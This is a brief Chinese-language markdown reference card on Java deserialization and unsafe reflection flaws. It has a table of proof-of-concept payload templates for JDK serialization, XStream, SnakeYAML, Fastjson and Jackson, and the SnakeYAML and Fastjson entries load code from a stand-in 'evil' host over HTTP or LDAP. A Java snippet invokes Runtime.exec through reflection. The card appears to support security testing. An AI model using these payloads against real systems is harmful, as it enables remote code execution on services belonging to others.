# Deserialization & Reflection Family（Unsafe Deserialization / Unsafe Reflection）

## 共性

反序列化和反射本质是"**对象图重建**" / "**动态类加载与方法调用**"。当输入流可控时，
攻击者可注入 gadget chain 触发任意代码执行（RCE）。

## PoC 模板

| 反序列化框架 | poc_payload 思路 |
|---|---|
| JDK ObjectInputStream | 用 ysoserial 生成 CommonsCollections1 / CommonsBeanutils1 / Spring1 等 gadget |
| XStream | `<sorted-set><string>...</string><dynamic-proxy>...</dynamic-proxy></sorted-set>` |
| SnakeYAML | `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil/"]]]]` |
| Fastjson | `{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://evil/x"}` |
| Jackson DefaultTyping | `["org.apache.xalan.xsltc.trax.TemplatesImpl", {...gadget...}]` |

### Unsafe Reflection PoC
```java
// 攻击者输入 className="java.lang.Runtime"
Class<?> cls = Class.forName(className);
cls.getMethod("exec", String.class).invoke(cls.getMethod("getRuntime").invoke(null), "id");
```
